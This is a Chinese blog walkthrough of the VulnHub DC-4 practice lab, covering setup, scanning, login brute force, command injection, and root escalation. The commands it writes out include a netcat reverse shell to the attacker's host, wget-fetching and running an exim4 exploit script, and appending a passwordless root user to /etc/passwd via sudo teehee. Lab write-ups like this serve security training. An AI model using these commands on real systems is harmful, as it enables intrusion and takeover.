
--- 
title:  [ vulnhub靶机通关篇 ] 渗透测试综合靶场 DC-4 通关详解 (附靶机搭建教程) 
tags: []
categories: [] 

---
>  
 <h2>🍬 博主介绍</h2> 
 👨‍🎓 博主介绍：大家好，我是  ，很高兴认识大家~ ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！ 




#### 文章目录
- - - <ul><li>- - - - - - - - - - - <ul><li>- - - - - - - - - - - - 


## 一、环境搭建：

### 1、靶场描述

```
DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

```

>  
 只有一个flag 


### 2、下载靶场环境

>  
 靶场下载地址： 


```
https://www.vulnhub.com/entry/dc-4,313/

```

>  
 下载下来的文件如下 


<img src="https://img-blog.csdnimg.cn/7cc0ff29d49d47228fc735cb0bec3ded.png" alt="在这里插入图片描述">

### 3、启动靶场环境

>  
 下载下来是虚拟机压缩文件，直接用Vmvare导入就行。 


<img src="https://img-blog.csdnimg.cn/ad98faec955c486e8ea54dee46248b45.png" alt="在这里插入图片描述">

>  
 设置虚拟机名称 


<img src="https://img-blog.csdnimg.cn/3f1d336b529940569ef2d290a4c166d3.png" alt="在这里插入图片描述">

>  
 导入中 


<img src="https://img-blog.csdnimg.cn/a86b9da36b314377a81c943d4875a7b3.png" alt="在这里插入图片描述">

>  
 导入完成之后打开后把网络模式设置为NAT模式。 


<img src="https://img-blog.csdnimg.cn/740057c99caf46229681b6c1fdea11ea.png" alt="在这里插入图片描述">

>  
 虚拟机开启之后界面如下，我们不知道ip，需要自己探活，网段知道：192.168.233.0/24 


<img src="https://img-blog.csdnimg.cn/2c3024ea5d2f4fb39982ccd7e7e0a62d.png" alt="在这里插入图片描述">

## 二、渗透靶场

### 1、目标：

>  
 目标就是我们搭建的靶场，靶场IP为：192.168.233.0/24 


### 2、信息收集：寻找靶机真实IP

>  
 使用nmap进行探活，寻找靶机ip 


```
nmap -sP 192.168.233.0/24

```

<img src="https://img-blog.csdnimg.cn/49614b147db54f89bcfdb6dab905f164.png" alt="在这里插入图片描述">

>  
 也可以使用arp-scan进行探活，寻找靶机ip 


```
arp-scan -l

```

<img src="https://img-blog.csdnimg.cn/201149b5fa734c0dab4c5f9e7d6e297f.png" alt="在这里插入图片描述">

>  
 本机ip为192.168.233.130 所以分析可得靶机ip为192.168.233.180 


```
192.168.233.1		vm8网卡
192.168.233.2		网关
192.168.233.179	靶机
192.168.233.254	DHCP服务器
192.168.233.130	kali本机

```

### 3、信息收集：探端口及服务

>  
 使用nmap探活端口 


```
nmap -A -p- -v 192.168.233.180

```

<img src="https://img-blog.csdnimg.cn/fadbdf4a974f4c11bf47388fe8b293f1.png" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/eec3655ddb1f42ad83bfa8325b568cdb.png" alt="在这里插入图片描述">

>  
 发现开放了22端口，存在ssh服务，OpenSSH 7.4p1 发现开放了80端口，存在web服务，nginx 1.15.10 也可以使用masscan探活端口 


```
masscan --rate=10000 --ports 0-65535 192.168.233.180

```

<img src="https://img-blog.csdnimg.cn/6fcf6c3fb67544c1974ff92b7d444dfc.png" alt="在这里插入图片描述">

>  
 然后进行web指纹识别 


```
whatweb -v 192.168.233.180

```

<img src="https://img-blog.csdnimg.cn/74733ee228544485a5bcd2867fe624fb.png" alt="在这里插入图片描述">

### 4、目录爆破

>  
 只发现登录框 


<img src="https://img-blog.csdnimg.cn/76aa1e62425b4e6f963d80700392b7ba.png" alt="在这里插入图片描述">

### 5、访问web服务

```
http://192.168.233.180/

```

<img src="https://img-blog.csdnimg.cn/6a9f8a8f1d234075b7fe455ad0b2687b.png" alt="在这里插入图片描述">

>  
 发现是一个登录框，我们第一反应就是能不能爆破出弱口令，然后就是有没有可能使用万能密码 


### 6、爆破账号密码

>  
 这里使用bp尝试获取弱口令 Bp抓个包，发送到爆破模块 


<img src="https://img-blog.csdnimg.cn/473e8ac9607a4e3f8c0eb0e385b1441c.png" alt="在这里插入图片描述">

>  
 设置好爆破点 


<img src="https://img-blog.csdnimg.cn/e96357b7ecbd42e7ab370b6b1eb9c721.png" alt="在这里插入图片描述">

>  
 导入优秀的字典 我使用的字典 


```
https://pan.baidu.com/s/1fMyJSuftvT3NSOjA7BkT-A?pwd=uiwr 

```

>  
 账号我导入了一个常用用户名 


<img src="https://img-blog.csdnimg.cn/67130990b13340f591a8f7f8c1b8c67b.png" alt="在这里插入图片描述">

>  
 密码我导入了一个top1000 


<img src="https://img-blog.csdnimg.cn/a395af334873421eb0a3b2dc4608ccdd.png" alt="在这里插入图片描述">

>  
 开始爆破 


<img src="https://img-blog.csdnimg.cn/44b6a74480d04b1b80a5d285f35a018a.png" alt="在这里插入图片描述">

>  
 爆破中 


<img src="https://img-blog.csdnimg.cn/a34188f978614fa498fcde614d37b6fc.png" alt="在这里插入图片描述">

>  
 爆破结果如下： 发现admin/happy这一组返回包长度最长，猜想他就是账号密码 


<img src="https://img-blog.csdnimg.cn/328c9395dcf741cb93dcf4da2b70b119.png" alt="在这里插入图片描述">

>  
 使用admin/happy登录成功 


<img src="https://img-blog.csdnimg.cn/25800d3143984672917bc617ab7d2ed7.png" alt="在这里插入图片描述">

### 7、发现任意命令执行

>  
 发现它有一个命令，我们点进去看一下 


<img src="https://img-blog.csdnimg.cn/19c47d5820be456ca6734f0702ee71b0.png" alt="在这里插入图片描述">

>  
 发现这里可以执行三种命令 点击list files好像是执行了ls -l 


<img src="https://img-blog.csdnimg.cn/ca68ddf117c34d619ac9f630b4d23f45.png" alt="在这里插入图片描述">

>  
 点击run抓个包看一下 发现真的是执行了ls -l 


<img src="https://img-blog.csdnimg.cn/9706c0baa57d4f9f86f3984e6d5097e0.png" alt="在这里插入图片描述">

>  
 发现执行了ls并回返值，猜想能不能执行任意命令 把抓到的包放入重放攻击模块修改命令进行重放攻击 由上面ls -l拼接方式看，我们可以知道空格使用+代替 执行ls 


<img src="https://img-blog.csdnimg.cn/1a4134de58104ac4931cbc45cebffffa.png" alt="在这里插入图片描述">

>  
 执行whoami 


<img src="https://img-blog.csdnimg.cn/494748bd95df48f4bba5d8d2d4aff4ac.png" alt="在这里插入图片描述">

>  
 执行id 


<img src="https://img-blog.csdnimg.cn/9ebe4149fdf64dfe94872804c42e1347.png" alt="在这里插入图片描述">

>  
 执行ip+add 


<img src="https://img-blog.csdnimg.cn/ac893645de04453ab7b287a444b6d51c.png" alt="在这里插入图片描述">

>  
 由上面的测试可知确实存在任意命令执行，空格由+代替 


### 8、反弹shell到kali

#### 1.攻击机监听

```
nc -lvvp 55555

```

>  
 Nc反弹shell详解在文末给出链接 


<img src="https://img-blog.csdnimg.cn/fbb913ded85e4d45a0c2b21cf44ad976.png" alt="在这里插入图片描述">

#### 2.靶机连接

>  
 连接命令 


```
nc 192.168.233.130 55555 -e /bin/bash 

```

>  
 经过+拼接如下 


```
nc+192.168.233.130+55555+-e+/bin/bash

```

<img src="https://img-blog.csdnimg.cn/60714b8a9cf24d8db9aedb944e7a40bc.png" alt="在这里插入图片描述">

#### 3.反弹shell成功

<img src="https://img-blog.csdnimg.cn/00e8c6f4f1db4595aadde94bb3bd9f91.png" alt="在这里插入图片描述">

>  
 执行ls 


<img src="https://img-blog.csdnimg.cn/f9f2ca4a7c63440dab14190c7cc1e7ed.png" alt="在这里插入图片描述">

### 9、进入交互式shell

>  
 都知道上面的到的shell不好用，我们进入交互式shell 


```
python -c "import pty;pty.spawn('/bin/bash')"

```

<img src="https://img-blog.csdnimg.cn/c44afc105f0146ec9f27cf3f3b670f24.png" alt="在这里插入图片描述">

### 10、teehee提权

>  
 这个靶机可以使用exim4提权也可以使用teehee提权，两种提权方式选择一种即可，这里我两种提权方式都有些到 


#### 1、查看当前权限

>  
 查看当前权限，不是root权限 


```
id 
Whoami

```

<img src="https://img-blog.csdnimg.cn/42b3f5cb858f4a7387fdb992dc08b17d.png" alt="在这里插入图片描述">

#### 2、发现old-passwords.bak文件

>  
 查看系统里面有什么文件 在/home/jim/backups下看到一个old-passwords.bak文件，看名字应该是一堆密码，而且是jim用户使用过的密码 


<img src="https://img-blog.csdnimg.cn/3603ab32aff847709c10572c8bab3fda.png" alt="在这里插入图片描述">

>  
 打开看一下发现一堆密码 


<img src="https://img-blog.csdnimg.cn/14af5a48008746c68ba90db03931ca44.png" alt="在这里插入图片描述">

>  
 感觉可以做爆破字典 把文件保存下来 


<img src="https://img-blog.csdnimg.cn/1c1298f6f378460d9aa103c6e4f13180.png" alt="在这里插入图片描述">

#### 3、爆破出jim的ssh密码

>  
 使用hydra爆破一下ssh密码 


```
hydra -l jim -P /root/Desktop/old-passwords.bak.txt 192.168.233.180 ssh

```

>  
 用户名为jim，密码为我们保存的old-passwords.bak.txt 


<img src="https://img-blog.csdnimg.cn/bd418551516647f99f70047b45e8222f.png" alt="在这里插入图片描述">

>  
 果然爆破出一个一对用户密码 


```
jim/jibril04

```

>  
 使用kali登录jim 


```
ssh jim@192.168.79.132

```

>  
 密码是jibril04 成功登录jim用户 


<img src="https://img-blog.csdnimg.cn/1052f88fc93347aca19f8cce4c72a05d.png" alt="在这里插入图片描述">

#### 4、发现charles用户密码

>  
 继续探索 在/var/spool/mail目录下发现一封名为jim的邮件 邮件内容大致为： 我今天要去度假了，所以老板让我给你我的密码，以防有什么事情发生错了。 也就是说这里我们又拿到了一个用户名和密码 


```
Charles/^xHhA&amp;hvim0y

```

<img src="https://img-blog.csdnimg.cn/2a5126b500cc4f22aed6b4568b92036f.png" alt="在这里插入图片描述">

>  
 直接su 切换用户试试 


```
su Charles

```

>  
 提示没有这个用户名，那很明显首字母我们需要小写 


```
su charles

```

>  
 然后输入密码 


```
^xHhA&amp;hvim0y

```

<img src="https://img-blog.csdnimg.cn/caf4275f04e947cfb232c592bc211dcb.png" alt="在这里插入图片描述">

>  
 成功用su命令切换到用户charles 


#### 5、teehee提权

>  
 1、查看使用sudo运行的命令 


```
sudo -l

```

>  
 看到一个teehee提权，我们可以用teehee写一些信息到/etc/passwd里面 


<img src="https://img-blog.csdnimg.cn/a12d5e424dd2457ab95a1e38f207d364.png" alt="在这里插入图片描述">

>  
 2、执行如下命令进行提权： 


```
echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd 

```

>  
 命令的意思大致利用teehee为把如下信息写到/etc/passwd里面，在用户名admin 没有密码为管理员权限，进入的时候运行/bin/bash 3、/etc/passwd 内每个字段含义如下 


```
admin::0:0:::/bin/bash
username:password:User ID:Group ID:comment:home directory:shell

```

>  
 4、成功提权为root 


<img src="https://img-blog.csdnimg.cn/90abad863c8540f3980e7c065b5c419d.png" alt="在这里插入图片描述">

### 11、exim4提权

>  
 这个靶机可以使用exim4提权也可以使用teehee提权，两种提权方式选择一种即可，这里我两种提权方式都有些到 


#### 1、查看当前权限

>  
 查看当前权限，不是root权限 


```
id 
whoami

```

<img src="https://img-blog.csdnimg.cn/e5baa62c4ec444d295afa36b53115fd5.png" alt="在这里插入图片描述">

#### 2、发现可以用exim4进行提权

>  
 看看具有SUID权限的命令 


```
find / -user root -perm -4000 -print 2&gt;/dev/null

```

>  
 发现exim4命令具有SUID权限，exim4是可以用来提权的 


<img src="https://img-blog.csdnimg.cn/9d410e7d781f4865a408f6850de21518.png" alt="在这里插入图片描述">

>  
 查看查看exim4版本，发现exim4版本为4.89 


```
exim4 --version

```

<img src="https://img-blog.csdnimg.cn/8b10e93f08ab4820829d7a35c783b523.png" alt="在这里插入图片描述">

#### 3、寻找exim4提权脚本

>  
 1、本地漏洞库查找exim 4漏洞 


```
searchsploit exim 4

```

>  
 exim4版本为4.89，发现有好几个可以用，还有两个提权，这里我们选用46996 


<img src="https://img-blog.csdnimg.cn/4c632d5b11f54735825b8ec0354ea7c6.png" alt="在这里插入图片描述">

#### 4、上传提权脚本到靶机

>  
 开启apache服务 


```
systemctl start apache2.service  

```

>  
 将选用的46996拷贝到kali的apache web页面下 


```
cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html 

```

<img src="https://img-blog.csdnimg.cn/5abe04ce963345f3ab9e2b37b6cddba0.png" alt="在这里插入图片描述">

>  
 访问kali服务下载提权脚本 


```
http://kali-ip/46996.sh

```

>  
 DC-4下载提权脚本 


```
wget http://192.168.233.130/46996.sh

```

>  
 提示可以访问，但拒绝访问，可能是目录权限不够，尝试切换到/tmp目录进行下载 


<img src="https://img-blog.csdnimg.cn/6e5ddfb65ca843a1bc264fc2f1e3ae03.png" alt="在这里插入图片描述">

```
cd /tmp
wget http://192.168.233.130/46996.sh

```

>  
 成功下载提权脚本 


<img src="https://img-blog.csdnimg.cn/0142f4d58d7c40ec8e1d598faf6b93c4.png" alt="在这里插入图片描述">

#### 5、exim4提权

>  
 我们已经上传了提权脚本到靶机，接下来我们需要运行脚本进行提权 


```
ls -l

```

<img src="https://img-blog.csdnimg.cn/561ccc9bc5fe4bee8177e564e1a7dbcc.png" alt="在这里插入图片描述">

>  
 查看脚本权限，发现没有执行权限，我们需要给脚本加执行权限 


```
chmod +x 46996.sh

```

<img src="https://img-blog.csdnimg.cn/5547cd930bc947699a8178293a2a8192.png" alt="在这里插入图片描述">

>  
 执行脚本 


```
./46996.sh

```

<img src="https://img-blog.csdnimg.cn/5958db85401d45d0bbfbfc833af81541.png" alt="在这里插入图片描述">

>  
 成功提权为root权限 


<img src="https://img-blog.csdnimg.cn/d842e6d487424453be300fb77136daa8.png" alt="在这里插入图片描述">

>  
 发现flag 


<img src="https://img-blog.csdnimg.cn/6caf5e5cacb04922b4d8faeb0d89aebe.png" alt="在这里插入图片描述">

### 12.发现flag.txt

>  
 有了root权限，我们切换到root目录下，查看文件，发现flag.txt文件 


```
cd /root
ls
cat flag.txt

```

<img src="https://img-blog.csdnimg.cn/7dc3c924de864968845206bfd37bc3e9.png" alt="在这里插入图片描述">

## 三、相关资源

            
